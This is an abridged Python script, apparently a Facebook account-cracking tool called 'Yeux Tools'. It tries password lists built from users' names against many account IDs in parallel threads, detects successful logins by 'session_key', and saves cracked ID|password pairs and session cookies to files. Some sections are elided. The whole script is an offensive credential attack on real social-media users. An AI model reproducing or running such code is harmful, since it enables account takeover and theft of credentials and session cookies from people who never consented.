# Orignally Written By Yeux Khan
...
try:
	...
	os.system('python Yeux.py')
os.system("clear")
print('\n\033[1;32m Loading Yeux Tools...')
...
os.system('xdg-open https://www.facebook.com/100090195772151')
...
def file_crack():
	...
	with tred(max_workers=30) as YEUX:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				YEUX.submit(api1,ids,names,passlist)
			else:
				YEUX.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[Yeux]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[Yeux-OK] '+uid+' | '+pas)
						print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'Yeux_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'Yeux_COOKIES.txt')
						...
						print(f'\r\r\33[1m\33[1;35m [Yeux-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'Yeux-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[Yeux-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [Yeux-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'Yeux_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
